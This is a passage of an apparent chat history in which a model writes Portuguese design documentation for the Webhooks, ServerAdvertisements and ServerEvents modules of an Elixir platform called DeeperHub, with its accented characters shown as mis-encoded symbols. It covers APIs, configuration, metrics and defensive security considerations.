        *   Chama `DeeperHub.Webhooks.PayloadSigner.sign(formatted_payload, webhook.secret)` para gerar a assinatura.
        *   Cria uma nova entrada `WebhookEventSchema` com status `:pending`, `webhook_id`, `event_type`, `payload_sent`, `signature_header_value`.
        *   Enfileira o `webhook_event_id` para o `DeeperHub.Webhooks.Dispatcher` (ex: usando `Core.BackgroundTaskManager`).
4.  **`Dispatcher` (Worker):**
    *   Pega um `webhook_event_id` da fila.
    *   Busca o `WebhookEventSchema` e o `WebhookSchema` associado.
    *   Chama `DispatcherWithCircuitBreaker.dispatch_webhook(webhook_schema.url, webhook_event.payload_sent, %{headers: %{\"X-DeeperHub-Signature\" => webhook_event.signature_header_value, ...}, method: \"POST\"})`.
5.  **`DispatcherWithCircuitBreaker`:**
    *   Verifica o estado do circuit breaker para a URL do webhook.
    *   Se fechado/meio-aberto, faz a chamada HTTP via `Core.HTTPClient`.
6.  **Resultado da Chamada HTTP:**
    *   **Sucesso (ex: 2xx):** `Dispatcher` atualiza `WebhookEventSchema` para `:delivered`, registra `response_code`. Atualiza `WebhookSchema` com `last_successful_delivery_at`, reseta `failure_count`.
    *   **Falha Retryable (ex: 5xx, timeout):** `Dispatcher` atualiza `WebhookEventSchema` para `:failed_retryable`, incrementa `attempts`, calcula `next_retry_at`. Atualiza `WebhookSchema` com `last_failure_at`, incrementa `failure_count`. Se `failure_count` exceder limiar, `Monitor` pode desativar o `WebhookSchema`.
    *   **Falha Permanente (ex: 4xx, exceto 429):** `Dispatcher` atualiza `WebhookEventSchema` para `:failed_permanent`.
7.  **`Scheduler`:** Periodicamente, busca `WebhookEventSchema`s com status `:failed_retryable` cujo `next_retry_at` j√° passou e os re-enfileira para o `Dispatcher`.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada `DeeperHub.Webhooks`)

### 6.1. Gerenciamento de Webhooks

*   **`DeeperHub.Webhooks.register_webhook(client_id :: String.t(), url :: String.t(), event_types :: list(String.t()), opts :: keyword()) :: {:ok, WebhookSchema.t()} | {:error, Ecto.Changeset.t() | term()}`**
    *   `opts`: `:secret` (String.t, ser√° criptografado), `:custom_headers` (map), `:description` (String.t).
*   **`DeeperHub.Webhooks.update_webhook(webhook_id :: String.t(), client_id :: String.t(), attrs :: map()) :: {:ok, WebhookSchema.t()} | {:error, Ecto.Changeset.t() | :unauthorized}`**
    *   `attrs`: Pode atualizar `url`, `event_types`, `secret`, `custom_headers`, `is_active`.
*   **`DeeperHub.Webhooks.delete_webhook(webhook_id :: String.t(), client_id :: String.t()) :: :ok | {:error, :unauthorized | :not_found}`**
*   **`DeeperHub.Webhooks.get_webhook(webhook_id :: String.t(), client_id :: String.t()) :: {:ok, WebhookSchema.t() | nil}`**
*   **`DeeperHub.Webhooks.list_webhooks_for_client(client_id :: String.t(), filters :: map(), opts :: keyword()) :: {:ok, list(WebhookSchema.t()), Pagination.t()}`**
    *   `filters`: `:is_active`, `:event_type`.

### 6.2. Hist√≥rico de Eventos e Diagn√≥stico

*   **`DeeperHub.Webhooks.list_webhook_events(webhook_id :: String.t(), client_id :: String.t(), filters :: map(), opts :: keyword()) :: {:ok, list(WebhookEventSchema.t()), Pagination.t()}`**
    *   `filters`: `:status` (`:pending`, `:delivered`, `:failed_retryable`, `:failed_permanent`), `:event_type`, `date_range`.
*   **`DeeperHub.Webhooks.get_webhook_event_details(webhook_event_id :: String.t(), client_id :: String.t()) :: {:ok, WebhookEventSchema.t() | nil}`**
*   **`DeeperHub.Webhooks.resend_webhook_event(webhook_event_id :: String.t(), client_id :: String.t()) :: {:ok, :enqueued} | {:error, :not_retryable | term()}`** (Nova Sugest√£o)
*   **`DeeperHub.Webhooks.check_webhook_health(webhook_id :: String.t(), client_id :: String.t()) :: {:ok, %{status: atom(), last_success: DateTime.t() | nil, last_failure: DateTime.t() | nil, consecutive_failures: integer()}}`** (Envia um ping de teste).

### 6.3. Disparo Manual (para Testes por Clientes)

*   **`DeeperHub.Webhooks.trigger_test_event(webhook_id :: String.t(), client_id :: String.t(), event_type :: String.t() | nil, custom_payload :: map() | nil) :: {:ok, :event_enqueued} | {:error, term()}`**

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager`:

*   **`[:webhooks, :enabled]`** (Boolean): Habilita/desabilita o sistema de webhooks.
*   **`[:webhooks, :default_signature_algorithm]`** (Atom): Ex: `:hmac_sha256`.
*   **`[:webhooks, :default_http_timeout_ms]`** (Integer): Timeout padr√£o para chamadas HTTP. (Padr√£o: `5000`)
*   **`[:webhooks, :retry_policy, :max_attempts]`** (Integer): M√°ximo de retentativas. (Padr√£o: `5`)
*   **`[:webhooks, :retry_policy, :base_delay_seconds]`** (Integer): Atraso base para primeira retentativa.
*   **`[:webhooks, :retry_policy, :max_delay_seconds]`** (Integer): Atraso m√°ximo entre retentativas.
*   **`[:webhooks, :retry_policy, :backoff_factor]`** (Float): Fator para backoff exponencial.
*   **`[:webhooks, :auto_deactivation, :enabled]`** (Boolean): Se desativa webhooks automaticamente ap√≥s muitas falhas.
*   **`[:webhooks, :auto_deactivation, :failure_threshold]`** (Integer): N√∫mero de falhas consecutivas para desativar.
*   **`[:webhooks, :health_check, :interval_minutes]`** (Integer): Intervalo para `HealthCheckWorker`.
*   **`[:webhooks, :cleanup_worker, :event_log_retention_days]`** (Integer).
*   **`[:webhooks, :max_payload_size_kb]`** (Integer): Tamanho m√°ximo do payload.
*   **`[:webhooks, :allowed_url_schemes]`** (List de Strings): Ex: `[\"https\", \"http\"]`. (Padr√£o: `[\"https\"]`)
*   **`[:webhooks, :disallowed_ip_ranges_for_url]`** (List de Strings): Ranges CIDR para os quais as URLs de webhook n√£o podem resolver (prote√ß√£o SSRF). Ex: `[\"127.0.0.0/8\", \"10.0.0.0/8\", \"172.16.0.0/12\", \"192.168.0.0/16\", \"::1/128\"]`.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.*`: Todos os m√≥dulos Core.
*   `DeeperHub.Auth`/`RBAC`: Para autorizar quem pode registrar/gerenciar webhooks.
*   `DeeperHub.Accounts`: Para associar webhooks a `client_id` (que pode ser um `user_id` ou um ID de aplica√ß√£o cliente).
*   `DeeperHub.Core.EncryptionService`: Para criptografar segredos de webhook.
*   `DeeperHub.Security.SSRFProtection` (Impl√≠cito/Integrado): A valida√ß√£o de URL deve proteger contra Server-Side Request Forgery.

### 8.2. Bibliotecas Externas

*   `Jason`: Para payloads JSON.
*   Biblioteca HTTP Client (ex: `Finch`, `HTTPoison`) usada pelo `Core.HTTPClient`.
*   Biblioteca CRON para o `Scheduler` e workers (ex: `Quantum`).

## ü§ù 9. Como Usar / Integra√ß√£o

*   **UI de Desenvolvedor/Cliente:** Fornecer uma interface para clientes registrarem e gerenciarem seus webhooks, visualizarem hist√≥rico de entregas e segredos.
*   **M√≥dulos Internos:** `WebhookService` escuta eventos do `Core.EventBus` e dispara os webhooks correspondentes.
*   **Receptores de Webhook (Clientes):** Devem implementar um endpoint HTTP para receber os POSTs, validar a assinatura (se um segredo foi configurado) e processar o payload. Devem responder rapidamente com um status 2xx para indicar recebimento (processamento pode ser ass√≠ncrono no lado deles).

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar CRUD de `WebhookSchema`.
*   Testar a formata√ß√£o e assinatura de payloads.
*   Testar o fluxo de dispatch e retry com um servidor HTTP mockado como endpoint.
*   Testar o Circuit Breaker para endpoints.
*   Testar a l√≥gica de desativa√ß√£o autom√°tica e `HealthCheckWorker`.
*   Localiza√ß√£o: `test/deeper_hub/webhooks/`.

### 10.2. M√©tricas

*   `deeper_hub.webhooks.registered.count` (Gauge)
*   `deeper_hub.webhooks.events.published_to_dispatcher.count` (tags: `event_type`)
*   `deeper_hub.webhooks.delivery.attempts.count` (tags: `webhook_id_masked`, `event_type`, `http_status_code_group` (`2xx`, `4xx`, `5xx`, `timeout`, `circuit_open`))
*   `deeper_hub.webhooks.delivery.latency_ms` (Histograma, tags: `webhook_id_masked`, `event_type`)
*   `deeper_hub.webhooks.retries.scheduled.count`
*   `deeper_hub.webhooks.deactivated_due_to_failure.count` (tags: `webhook_id_masked`)
*   `deeper_hub.webhooks.circuit_breaker.state_changed.count` (tags: `webhook_url_host`, `new_state`)

### 10.3. Logs

*   **N√≠vel INFO:** Webhook registrado/atualizado/exclu√≠do. Evento enfileirado para dispatch. Entrega bem-sucedida.
*   **N√≠vel WARNING:** Falha na entrega de webhook (com detalhes do erro e c√≥digo de status). Retentativa agendada. Webhook desativado automaticamente. Circuit breaker aberto para um endpoint.
*   **N√≠vel ERROR:** Falha persistente na entrega ap√≥s todas as retentativas. Erro cr√≠tico no `Dispatcher` ou `Scheduler`.

### 10.4. Telemetria

*   `[:deeper_hub, :webhooks, :definition, :created | :updated | :deleted]`
*   `[:deeper_hub, :webhooks, :event, :prepared_for_dispatch]`
    *   Metadados: `%{webhook_id: id, event_id: id, event_type: type}`
*   `[:deeper_hub, :webhooks, :dispatch, :attempt, :start | :stop | :exception]`
    *   Metadados: `%{webhook_event_id: id, webhook_url: url, attempt_number: num}`
    *   No `:stop`: `%{http_status: code, result: :success | :failure_retryable | :failure_permanent}`
*   `[:deeper_hub, :webhooks, :health_check, :performed]`
    *   Metadados: `%{webhook_id: id, url: url, result: :healthy | :unhealthy}`

## ‚ùå 11. Tratamento de Erros

*   **Endpoints do Cliente Falhando:** A principal fonte de problemas. A l√≥gica de retry, circuit breaker e desativa√ß√£o autom√°tica s√£o para lidar com isso.
*   **Payload Inv√°lido para o Cliente:** O DeeperHub envia um payload JSON bem formado. Se o cliente n√£o conseguir process√°-lo, √© um problema do lado do cliente (geralmente resulta em 4xx ou 5xx que o DeeperHub trata).
*   **Segredo Incorreto:** Se o cliente n√£o conseguir validar a assinatura, ele deve tratar o webhook como n√£o aut√™ntico.
*   **Falhas Internas no DeeperHub:** Erros no `Dispatcher`, `Scheduler` devem ser logados criticamente e n√£o devem perder eventos (se um sistema de filas persistente como Oban for usado).

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **Valida√ß√£o de URL:** Impedir o registro de URLs que apontem para redes internas ou locais (SSRF). Verificar se a URL usa HTTPS.
*   **Segredos:** Segredos de webhook devem ser gerados com alta entropia e armazenados criptografados. Fornecer uma maneira para o cliente visualizar o segredo apenas uma vez ou regener√°-lo.
*   **Assinatura de Payload:** Sempre assinar payloads para permitir que o receptor verifique a autenticidade e integridade.
*   **Replay Attacks:** Incluir um timestamp e um ID de evento √∫nico no payload e na assinatura pode ajudar o receptor a detectar e rejeitar ataques de replay.
*   **N√£o Vazar Dados Sens√≠veis:** O componente `DeeperHub.Webhooks.Event` deve garantir que apenas dados apropriados e n√£o sens√≠veis sejam inclu√≠dos nos payloads.
*   **Prote√ß√£o do Endpoint de Registro:** A API para registrar webhooks deve ser protegida para evitar que atores maliciosos registrem endpoints para spam ou para exfiltrar dados.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Ao adicionar suporte para novos tipos de eventos que podem disparar webhooks, certifique-se de que o `DeeperHub.Webhooks.Event` saiba como formatar o payload para eles.
*   A l√≥gica de retry e backoff deve ser cuidadosamente ajustada para n√£o sobrecarregar endpoints que j√° est√£o com problemas.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Permitir que clientes configurem filtros mais granulares nos eventos que desejam receber (ex: apenas para um `server_id` espec√≠fico).
*   [ ] UI para clientes visualizarem logs de entrega detalhados, incluindo payloads enviados e respostas recebidas (com sanitiza√ß√£o).
*   [ ] Suporte para formatos de payload alternativos al√©m de JSON (ex: XML, form-urlencoded).
*   [ ] Permitir que clientes configurem suas pr√≥prias pol√≠ticas de retry (dentro de limites).
*   [ ] Testes de \"ping\" manuais para endpoints de webhook a partir da UI do cliente.
*   [ ] Assinaturas de eventos mais avan√ßadas, talvez usando GraphQL Subscriptions ou WebSockets mantidos pelo DeeperHub se a necessidade for de tempo real bidirecional.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Webhooks s√£o uma ferramenta poderosa para integra√ß√µes!

Com isso, cobrimos os principais m√≥dulos Core e uma boa parte da camada de Seguran√ßa. J√° detalhamos tamb√©m alguns m√≥dulos de \"Servi√ßo/Dom√≠nio\" como `Servers`, `Achievements`, `Challenges`, `Rewards`, `ServerReviews`, `ServerTags` e `Support`.

O que gostaria de explorar em seguida? Podemos focar em:
1.  Outros utilit√°rios de `Shared.Utils` (`DateUtils`, `MapUtils`, `ListUtils`, `ValidationUtils`, `SecurityUtils`, `FileUtils` - j√° fizemos alguns destes).
2.  M√≥dulos de dom√≠nio restantes da lista original de \"Servi√ßos\" (ex: `ServerAdvertisements`, `ServerEvents`, `ServerUpdateMessages`, `Lists` - que parecia gen√©rico).
3.  M√≥dulos de infraestrutura/seguran√ßa restantes (ex: `AtRestEncryptionService` se quisermos aprofundar al√©m do `Core.EncryptionService`, `ResponseSanitizer`)."""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue mostrando todos os que faltaram at√© o final"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Entendido! Vamos continuar percorrendo os m√≥dulos, focando agora nos que faltam da lista original e garantindo que cada um seja bem documentado e integrado na nova estrutura proposta.

Come√ßaremos pelos \"Servi√ßos\" restantes que parecem ser subdom√≠nios ou funcionalidades associadas aos Servidores, e depois podemos ir para o `Lists` que parece mais gen√©rico.

Vamos detalhar o `DeeperHub.ServerAdvertisements`.

---

# M√≥dulo: `DeeperHub.ServerAdvertisements` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.ServerAdvertisements`

O m√≥dulo `DeeperHub.ServerAdvertisements` √© respons√°vel por gerenciar **an√∫ncios de servidores** dentro da plataforma DeeperHub. Ele permite que propriet√°rios de servidores criem e paguem (se aplic√°vel) por an√∫ncios para destacar seus servidores, aumentando sua visibilidade para os jogadores.

Este m√≥dulo lida com:
*   A cria√ß√£o e configura√ß√£o de campanhas de an√∫ncios.
*   A exibi√ß√£o de an√∫ncios em locais designados da plataforma.
*   O rastreamento de desempenho dos an√∫ncios (visualiza√ß√µes, cliques).
*   A gest√£o do ciclo de vida dos an√∫ncios (agendamento, expira√ß√£o).

O objetivo √© fornecer uma ferramenta para propriet√°rios de servidores promoverem suas comunidades e, potencialmente, gerar receita para a plataforma. üòä

*(Nota: Na documenta√ß√£o original, este era `DeeperHub.Services.ServerAdvertisements`. Ser√° tratado como `DeeperHub.ServerAdvertisements`.)*

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Gerenciamento de Defini√ß√µes de An√∫ncios (`create_advertisement_campaign/1`, `update_advertisement_campaign/2`):**
    *   Permitir que propriet√°rios de servidores (ou administradores) criem campanhas de an√∫ncios.
    *   Defini√ß√£o inclui: servidor a ser anunciado, t√≠tulo/texto do an√∫ncio, imagem/banner, URL de destino (p√°gina do servidor), segmenta√ß√£o (opcional: tipo de jogo, regi√£o), or√ßamento/dura√ß√£o da campanha.
*   **Agendamento e Exibi√ß√£o de An√∫ncios:**
    *   Agendar o in√≠cio e o fim da exibi√ß√£o de um an√∫ncio.
    *   L√≥gica para selecionar quais an√∫ncios exibir em um determinado momento/local (ex: rota√ß√£o, leil√£o de lances se for um sistema mais complexo).
    *   Garantir que apenas an√∫ncios ativos e aprovados (se houver modera√ß√£o) sejam exibidos.
*   **Rastreamento de Performance (`track_advertisement_impression/1`, `track_advertisement_click/1`):**
    *   Registrar o n√∫mero de vezes que um an√∫ncio foi visualizado (impress√µes).
    *   Registrar o n√∫mero de vezes que um an√∫ncio foi clicado.
*   **Relat√≥rios de Performance:**
    *   Fornecer aos anunciantes estat√≠sticas sobre o desempenho de suas campanhas (impress√µes, cliques, CTR).
*   **Modera√ß√£o de An√∫ncios (Opcional):**
    *   Fluxo para aprova√ß√£o de novos an√∫ncios por administradores para garantir conformidade com as diretrizes da plataforma.
*   **Integra√ß√£o com Pagamentos (Se an√∫ncios forem pagos):**
    *   Integrar com um sistema de pagamento para cobrar pelas campanhas de an√∫ncio.
*   **Listagem de An√∫ncios:**
    *   `list_active_advertisements/1`: Para a plataforma buscar an√∫ncios a serem exibidos.
    *   `list_advertisements_by_server/2`: Para propriet√°rios verem seus an√∫ncios.
*   **Observabilidade e Auditoria:**
    *   Logar e metrificar a cria√ß√£o e o desempenho dos an√∫ncios.
    *   Auditar a cria√ß√£o e modifica√ß√£o de campanhas.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.ServerAdvertisements` (Fachada P√∫blica):**
    *   Ponto de entrada para gerenciamento e consulta de an√∫ncios.
    *   Delega para o `ServerAdvertisementsService`.
2.  **`DeeperHub.ServerAdvertisements.Services.ServerAdvertisementsService` (ou `DefaultServerAdvertisementsService`):**
    *   **Responsabilidade:** Orquestra a l√≥gica de neg√≥cio.
    *   **Intera√ß√µes:**
        *   `DeeperHub.Core.Repo`: Para CRUD com `AdvertisementSchema`.
        *   `DeeperHub.Servers`: Para validar `server_id`.
        *   `DeeperHub.Accounts`: Para `user_id` do criador.
        *   `DeeperHub.Auth`/`RBAC`: Para permiss√µes de gerenciamento.
        *   `DeeperHub.Core.EventBus`: Para eventos.
        *   `DeeperHub.Core.Cache`: Para cachear an√∫ncios ativos.
        *   (Opcional) `DeeperHub.Payments`: Se as campanhas forem pagas.
3.  **`DeeperHub.ServerAdvertisements.Schemas.AdvertisementSchema` (ex-`Advertisement`):**
    *   Campos: `id`, `server_id`, `user_id` (criador), `title`, `description`, `image_url`, `target_url`, `start_date`, `end_date`, `status` (`:pending_approval`, `:active`, `:inactive`, `:expired`, `:rejected`), `budget` (opcional), `impressions_count`, `clicks_count`.
4.  **`DeeperHub.ServerAdvertisements.AdSelectionLogic` (M√≥dulo Funcional, Nova Sugest√£o):**
    *   **Responsabilidade:** Se a l√≥gica de qual an√∫ncio exibir for complexa (ex: baseada em lances, segmenta√ß√£o, rota√ß√£o), este m√≥dulo conteria essa l√≥gica. Para casos simples, pode estar no `ServerAdvertisementsService`.
5.  **Workers (Opcional):**
    *   `AdvertisementStatusUpdateWorker`: Para atualizar o status de an√∫ncios (ex: de `:active` para `:expired`) periodicamente.
    *   `AdvertisementStatsAggregationWorker`: Para agregar estat√≠sticas de performance.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/server_advertisements/
‚îú‚îÄ‚îÄ server_advertisements.ex          # Fachada P√∫blica
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îî‚îÄ‚îÄ server_advertisements_service.ex # Servi√ßo principal
‚îÇ
‚îú‚îÄ‚îÄ schemas/
‚îÇ   ‚îî‚îÄ‚îÄ advertisement_schema.ex
‚îÇ
‚îú‚îÄ‚îÄ storage.ex                        # (Opcional)
‚îú‚îÄ‚îÄ ad_selection_logic.ex             # (Opcional, Nova Sugest√£o)
‚îÇ
‚îú‚îÄ‚îÄ workers/                          # Opcional
‚îÇ   ‚îú‚îÄ‚îÄ advertisement_status_update_worker.ex
‚îÇ   ‚îî‚îÄ‚îÄ advertisement_stats_aggregation_worker.ex
‚îÇ
‚îú‚îÄ‚îÄ cached_adapter.ex                 # (Opcional, da documenta√ß√£o original)
‚îú‚îÄ‚îÄ supervisor.ex
‚îî‚îÄ‚îÄ telemetry.ex
```

### 3.3. Decis√µes de Design Importantes

*   **Simplicidade vs. Complexidade do Sistema de An√∫ncios:** Decidir se ser√° um sistema simples de \"destaque\" ou um sistema mais complexo com lances, segmenta√ß√£o e otimiza√ß√£o de performance.
*   **Modera√ß√£o:** Se os an√∫ncios podem conter conte√∫do customizado, um fluxo de modera√ß√£o √© essencial.
*   **Rastreamento de Performance:** O rastreamento de impress√µes e cliques precisa ser eficiente e n√£o intrusivo.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Propriet√°rio de Servidor Cria uma Campanha de An√∫ncio:**
    *   Na UI, seleciona o servidor, define t√≠tulo, descri√ß√£o, imagem, or√ßamento e dura√ß√£o.
    *   API chama `ServerAdvertisements.create_advertisement_campaign(user_id, attrs)`.
    *   An√∫ncio √© salvo com status `:pending_approval` ou `:active` (se n√£o houver modera√ß√£o).
*   **Plataforma Exibe um An√∫ncio:**
    *   Uma se√ß√£o da UI (ex: sidebar, topo da lista de servidores) precisa exibir um an√∫ncio.
    *   Chama `ServerAdvertisements.get_advertisement_to_display(%{placement_id: \"sidebar\", user_context: ...})`.
    *   `AdSelectionLogic` escolhe um an√∫ncio ativo.
    *   `ServerAdvertisements.track_advertisement_impression(selected_ad.id)` √© chamado.
*   **Usu√°rio Clica em um An√∫ncio:**
    *   O link do an√∫ncio redireciona atrav√©s de um endpoint de rastreamento do DeeperHub.
    *   Esse endpoint chama `ServerAdvertisements.track_advertisement_click(ad_id)` e ent√£o redireciona para a `target_url` do an√∫ncio.

## üåä 5. Fluxos Importantes

### Fluxo de Sele√ß√£o e Exibi√ß√£o de An√∫ncio

1.  **Solicita√ß√£o de UI:** A interface do DeeperHub precisa de um an√∫ncio para um slot espec√≠fico.
2.  Chama `DeeperHub.ServerAdvertisements.get_advertisement_to_display(criteria)`.
3.  **`ServerAdvertisementsService` (ou `AdSelectionLogic`):**
    *   Busca an√∫ncios ativos que correspondam aos crit√©rios (ex: segmenta√ß√£o, n√£o exibido recentemente para este usu√°rio).
    *   Aplica l√≥gica de rota√ß√£o ou prioriza√ß√£o.
    *   Seleciona um an√∫ncio.
    *   Se nenhum an√∫ncio for selecionado, retorna `nil`.
4.  **`ServerAdvertisementsService`:**
    *   Se um an√∫ncio foi selecionado, chama `track_advertisement_impression(selected_ad.id)` (pode ser ass√≠ncrono).
    *   Retorna os dados do an√∫ncio para a UI.
5.  **UI:** Renderiza o an√∫ncio.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada `DeeperHub.ServerAdvertisements`)

*(Baseado nas responsabilidades e na documenta√ß√£o original para `Advertisement`)*

### 6.1. Gerenciamento de Campanhas (Propriet√°rio/Admin)

*   **`DeeperHub.ServerAdvertisements.create_advertisement_campaign(creator_user_id :: String.t(), attrs :: map()) :: {:ok, Advertisement.t()} | {:error, Ecto.Changeset.t()}`**
    *   `attrs`: `%{server_id: String.t(), title: String.t(), description: String.t(), image_url: String.t(), target_url: String.t(), start_date: Date.t(), end_date: Date.t(), budget: Decimal.t() | nil, bid_amount: Decimal.t() | nil}`.
*   **`DeeperHub.ServerAdvertisements.update_advertisement_campaign(advertisement_id :: String.t(), attrs :: map(), current_user_id :: String.t()) :: {:ok, Advertisement.t()} | {:error, Ecto.Changeset.t() | :unauthorized}`**
*   **`DeeperHub.ServerAdvertisements.delete_advertisement_campaign(advertisement_id :: String.t(), current_user_id :: String.t()) :: :ok | {:error, :unauthorized | :not_found}`**
*   **`DeeperHub.ServerAdvertisements.list_my_advertisements(user_id :: String.t(), filters :: map(), opts :: keyword()) :: {:ok, list(Advertisement.t()), Pagination.t()}`**
    *   `filters`: `:status`.

### 6.2. Exibi√ß√£o e Rastreamento

*   **`DeeperHub.ServerAdvertisements.get_advertisement_to_display(criteria :: map()) :: {:ok, Advertisement.t() | nil}`**
    *   `criteria`: `%{placement_id: String.t(), user_targeting_info: map() | nil}`.
*   **`DeeperHub.ServerAdvertisements.track_advertisement_impression(advertisement_id :: String.t(), viewer_context :: map()) :: :ok`**
    *   `viewer_context`: `%{user_id: String.t() | nil, ip_address: String.t()}`.
*   **`DeeperHub.ServerAdvertisements.track_advertisement_click(advertisement_id :: String.t(), clicker_context :: map()) :: {:ok, %{target_url: String.t()}}`**

### 6.3. Modera√ß√£o (Admin)

*   **`DeeperHub.ServerAdvertisements.list_pending_approval_advertisements(opts :: keyword()) :: {:ok, list(Advertisement.t()), Pagination.t()}`**
*   **`DeeperHub.ServerAdvertisements.approve_advertisement(advertisement_id :: String.t(), admin_user_id :: String.t()) :: {:ok, Advertisement.t()}`**
*   **`DeeperHub.ServerAdvertisements.reject_advertisement(advertisement_id :: String.t(), reason :: String.t(), admin_user_id :: String.t()) :: {:ok, Advertisement.t()}`**

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager`:

*   **`[:server_advertisements, :enabled]`** (Boolean).
*   **`[:server_advertisements, :requires_moderation]`** (Boolean): Se novos an√∫ncios precisam de aprova√ß√£o.
*   **`[:server_advertisements, :max_active_ads_per_placement]`** (Integer).
*   **`[:server_advertisements, :default_ad_duration_days]`** (Integer).
*   **`[:server_advertisements, :impression_counting_method]`** (Atom): `:simple_counter` ou `:unique_user_per_day`.
*   **`[:server_advertisements, :min_bid_amount]`** (Decimal, se houver sistema de lances).
*   **`[:server_advertisements, :cache, :active_ads_ttl_seconds]`** (Integer).

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.*`.
*   `DeeperHub.Servers`: Para `server_id`.
*   `DeeperHub.Accounts`: Para `user_id`.
*   `DeeperHub.Auth`/`RBAC`: Para permiss√µes.
*   `DeeperHub.Notifications`: Para notificar sobre status de an√∫ncios.
*   `DeeperHub.Payments` (Opcional): Se os an√∫ncios forem pagos.
*   `DeeperHub.Audit`.

### 8.2. Bibliotecas Externas

*   `Ecto`.

## ü§ù 9. Como Usar / Integra√ß√£o

*   **Frontend/UI da Plataforma:** Em locais designados (sidebar, header, entre listagens), chama `get_advertisement_to_display` para buscar e renderizar um an√∫ncio.
*   **Painel do Propriet√°rio do Servidor:** Interface para criar e gerenciar campanhas de an√∫ncios.
*   **Painel de Administra√ß√£o:** Interface para moderar an√∫ncios e ver estat√≠sticas globais.

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar CRUD de campanhas de an√∫ncio.
*   Testar a l√≥gica de sele√ß√£o de an√∫ncios (`AdSelectionLogic`).
*   Testar o rastreamento de impress√µes e cliques.
*   Testar o fluxo de modera√ß√£o.
*   Testar o agendamento e expira√ß√£o de an√∫ncios.
*   Localiza√ß√£o: `test/deeper_hub/server_advertisements/`.

### 10.2. M√©tricas

*   `deeper_hub.server_advertisements.campaigns.created.count`
*   `deeper_hub.server_advertisements.impressions.count` (tags: `advertisement_id`, `placement_id`)
*   `deeper_hub.server_advertisements.clicks.count` (tags: `advertisement_id`, `placement_id`)
*   `deeper_hub.server_advertisements.active_ads.gauge` (tags: `placement_id`)
*   `deeper_hub.server_advertisements.moderation.status_changed.count` (tags: `new_status`)

### 10.3. Logs

*   **N√≠vel INFO:** Nova campanha criada, an√∫ncio exibido, clique registrado. Status de an√∫ncio alterado.
*   **N√≠vel WARNING:** Or√ßamento da campanha esgotado. An√∫ncio rejeitado na modera√ß√£o.
*   **N√≠vel ERROR:** Falha ao processar pagamento da campanha.

### 10.4. Telemetria

*   `[:deeper_hub, :server_advertisements, :campaign, :created | :updated | :status_changed]`
*   `[:deeper_hub, :server_advertisements, :ad, :impression]`
*   `[:deeper_hub, :server_advertisements, :ad, :click]`

## ‚ùå 11. Tratamento de Erros

*   Falhas no rastreamento de impress√µes/cliques n√£o devem quebrar a exibi√ß√£o da p√°gina principal.
*   Erros na sele√ß√£o de an√∫ncios devem resultar em um slot de an√∫ncio vazio ou um an√∫ncio padr√£o, n√£o um erro na p√°gina.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **Conte√∫do do An√∫ncio:** Se os an√∫ncios permitem HTML customizado ou scripts, eles s√£o um vetor de XSS significativo. Idealmente, os an√∫ncios s√£o baseados em templates predefinidos com campos de texto/imagem limitados, e todo o conte√∫do √© rigorosamente sanitizado.
*   **URLs de Destino:** Validar e, possivelmente, verificar `target_url`s para evitar redirecionamentos para sites maliciosos.
*   **Fraude de Cliques/Impress√µes:** Se o sistema de an√∫ncios envolver pagamento por clique/impress√£o, mecanismos para detectar e prevenir fraude s√£o necess√°rios (integrando com `FraudDetection`).

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Novos placements de an√∫ncios devem ser coordenados com a equipe de UI/UX.
*   A l√≥gica de `AdSelectionLogic` pode se tornar complexa e deve ser bem testada.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar um sistema de lances (bidding) para a exibi√ß√£o de an√∫ncios.
*   [ ] Adicionar segmenta√ß√£o de audi√™ncia mais avan√ßada (geogr√°fica, por interesse, por comportamento do usu√°rio).
*   [ ] Testes A/B para diferentes criativos de an√∫ncio.
*   [ ] Limitar a frequ√™ncia com que um mesmo usu√°rio v√™ o mesmo an√∫ncio (frequency capping).
*   [ ] Integra√ß√£o com redes de an√∫ncios externas para preencher invent√°rio n√£o vendido (ad network mediation).

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Este m√≥dulo de an√∫ncios pode variar muito em complexidade dependendo dos requisitos!

Pr√≥ximo? Que tal `DeeperHub.ServerEvents` ou `DeeperHub.ServerUpdateMessages` para continuar com os m√≥dulos relacionados a `Servers`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok! Vamos prosseguir com `DeeperHub.ServerEvents`. Este m√≥dulo √© focado em permitir que os propriet√°rios de servidores criem e gerenciem eventos para suas comunidades.

---

# M√≥dulo: `DeeperHub.ServerEvents` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.ServerEvents`

O m√≥dulo `DeeperHub.ServerEvents` gerencia **eventos agendados e em andamento associados a servidores espec√≠ficos** na plataforma DeeperHub. Ele permite que propriet√°rios de servidores criem e anunciem eventos para suas comunidades, como torneios, manuten√ß√µes programadas, eventos de XP em dobro, lan√ßamentos de conte√∫do, etc.

Este m√≥dulo lida com:
*   A defini√ß√£o, cria√ß√£o e gerenciamento de eventos de servidor.
